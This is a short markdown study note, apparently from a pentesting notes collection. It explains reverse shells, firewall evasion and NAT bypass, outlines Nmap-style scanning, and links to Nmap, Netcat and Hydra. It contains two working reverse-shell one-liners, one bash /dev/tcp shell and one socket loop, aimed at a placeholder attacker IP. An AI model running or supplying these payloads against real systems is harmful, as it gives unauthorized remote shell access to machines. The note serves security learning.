# 📡 Network Attacks & Exploitation

> **Focus:** Transitioning from infrastructure discovery to active exploitation and remote access.

---

## 🐚 The Reverse Shell Concept
A **Reverse Shell** is a technique where the *target* machine initiates an outgoing connection to the *attacker's* machine.



### Why use a Reverse Shell?
* **Firewall Evasion**: Most firewalls are configured to block *incoming* connections but allow *outgoing* traffic (especially on ports like 80, 443, or 53).
* **Bypassing NAT**: It allows the target to find the attacker even if the target is behind a private network.

### Common Payloads
| Type | Payload Syntax |
| :--- | :--- |
| **Bash** | `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` |
| **Socket** | `exec 5<>/dev/tcp/IP/PORT; cat <&5 \| while read line; do $line 2>&5 >&5; done` |

---

## 🛠️ Scanning Methodology
Effective network exploitation starts with precise targeting to avoid detection and system crashes.

1.  **Host Discovery**: Identifying which IPs are "alive" using `-sn` (Ping Scan).
2.  **Port Scanning**: Checking for open "doors" (TCP/UDP).
3.  **Fingerprinting**: Analyzing response patterns to determine the OS and service versions.

---

## 🔗 Associated Tools
* [Nmap](../../TOOLS/nmap.md) - Infrastructure probing and fingerprinting.
* [Netcat](../../TOOLS/netcat.md) - The primary tool for listeners and raw data transfer.
* [Hydra](../../TOOLS/hydra.md) - Protocol brute-forcing (SSH, Web, etc.).
